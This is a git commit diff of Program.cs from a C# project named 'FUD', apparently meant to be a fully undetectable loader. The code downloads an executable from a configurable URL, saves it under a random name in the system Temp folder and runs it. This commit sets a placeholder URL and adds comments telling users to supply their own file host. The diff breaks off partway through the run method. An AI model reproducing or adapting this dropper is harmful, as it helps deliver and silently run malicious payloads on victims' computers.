014644587173e0016858d860ce6b1a21f79c5e7d
Paimon <88497195+Paim0naletka@users.noreply.github.com>
2022-04-17 19:06:02 +0700

    Update Program.cs

--- FUD/Program.cs
+++ FUD/Program.cs
@@ -7,28 +7,28 @@ namespace FUD
 {
 	internal class Program
 	{
-		private static void Main(string[] args)
+		private static void Main(string[] args) // Download your file and run this application
 		{
-			string url = "";
+			string url = "http://localhost"; // Your URL file
 			string fileLocate = Program.FileName();
 			Program.FileName();
 			Program.Download(fileLocate, url);
 			Program.Runprocess(fileLocate);
 		}
 
-		private static void Download(string FileLocate, string url)
+		private static void Download(string FileLocate, string url) //Find your file
 		{
 			new WebClient().DownloadFile(new Uri(url), FileLocate + ".exe");
 		}
 
-		private static string FileName()
+		private static string FileName() // Remove to Temp Folder
 		{
 			string tempPath = Path.GetTempPath();
 			string Ran = Path.GetRandomFileName();
 			return tempPath + Ran;
 		}
 
-		private static void Runprocess(string FileLocate)
+		private static void Runprocess(string FileLocate) // Start Process
 		{
 			new Process
 			{
